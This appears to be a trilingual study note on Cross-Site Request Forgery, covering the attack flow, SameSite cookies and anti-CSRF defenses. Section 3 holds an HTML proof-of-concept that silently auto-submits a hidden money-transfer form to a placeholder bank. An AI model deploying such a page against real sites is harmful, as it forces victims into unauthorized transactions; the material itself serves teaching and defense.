## 1. 🏢 Overview — What is CSRF?

### 🇮🇩 Bahasa Indonesia
**Cross-Site Request Forgery (CSRF)** adalah kerentanan di mana aplikasi web tepercaya mengeksekusi aksi yang tidak diinginkan atas nama pengguna yang saat ini sedang terotentikasi. Penyerang memanfaatkan fakta bahwa browser secara otomatis menyertakan semua **session cookie dan kredensial autentikasi** dalam setiap request HTTP lintas domain (*cross-origin*).

### 🇬🇧 English
**Cross-Site Request Forgery (CSRF)** is a web vulnerability that tricks an authenticated victim's browser into executing unauthorized, state-changing actions on a trusted web application. CSRF exploits the inherent browser behavior of automatically appending **session cookies and stored ambient credentials** to cross-site HTTP requests.

### 🇯🇵 日本語
**クロスサイトリクエストフォージェリ（CSRF）**は、認証済みのユーザーが意図しない操作（パスワード変更、送金など）を攻撃者によって強制的に実行させられる脆弱性です。ブラウザがクロスオリジンリクエストに対しても**Cookie（セッション情報）を自動的に付加して送信する仕組み**を悪用します。

## 2. 🔄 CSRF Attack Lifecycle

```
[ Victim User ] ─── 1. Logs into target bank (Session Cookie stored) ───> [ Bank Web Server ]
      │
      ├── 2. Simultaneously visits attacker's website (evil.com) ───────> [ Attacker Server (evil.com) ]
      │                                                                          │
      │<── 3. Receives malicious webpage with hidden auto-submit form ───────────┘
      │
      └── 4. Browser sends POST /transfer (with Bank Session Cookie!) ───> [ Bank Web Server ]
             (Bank executes transfer: $10,000 to Attacker Account!)
```

## 3. 💣 CSRF Exploit Proof-of-Concept (HTML PoC)

```html
<!-- Malicious Exploit Page hosted on attacker.com -->
<!DOCTYPE html>
<html>
<head>
    <title>Claim Your Free Reward!</title>
</head>
<body>
    <h1>Loading exciting prize...</h1>
    
    <!-- Hidden form that targets vulnerable banking endpoint -->
    <form id="csrfForm" action="http://vulnerable-bank.com/api/transfer" method="POST">
        <input type="hidden" name="recipient" value="attacker_account_998">
        <input type="hidden" name="amount" value="5000">
    </form>

    <script>
        // Auto-submit as soon as page loads
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```

## 4. 🍪 The `SameSite` Cookie Attribute

| SameSite Mode | Behavior / Mekanisme | CSRF Protection Level |
|:---|:---|:---|
| **`Strict`** | Cookie **tidak pernah** dikirim pada request cross-site (bahkan klik link biasa). | 🟢 Proteksi Maksimal |
| **`Lax` (Default modern)** | Cookie dikirim pada navigasi top-level yang aman (`GET` via click link), tapi **diblokir pada `POST` cross-site**. | 🟡 Sangat Baik (Bisa jebol jika endpoint pakai GET) |
| **`None`** | Cookie selalu dikirim pada semua request cross-site (wajib menyertakan flag `Secure`). | 🔴 Rentan CSRF jika tanpa Anti-CSRF Token |

## 5. 🛡️ Comprehensive Defense & Mitigation

1. **Synchronizer Token Pattern (Anti-CSRF Tokens)**:
   - Server menghasilkan token kriptografi acak yang unik per sesi pengguna.
   - Token disematkan dalam form HTML tersembunyi (`<input type="hidden" name="csrf_token" value="...">`).
   - Server memvalidasi token setiap kali menerima request `POST/PUT/DELETE`. Penyerang dari domain luar tidak bisa membaca token ini karena dibatasi oleh SOP (*Same-Origin Policy*).
2. **Re-Authentication / Step-Up Auth**: Mewajibkan user memasukkan password saat ini untuk aksi kritis (ubah password, ubah email, transfer dana).
3. **Custom Request Headers**: Untuk API SPA (React/Vue), request menggunakan header kustom (contoh: `X-Requested-With` atau `Authorization: Bearer <token>`).
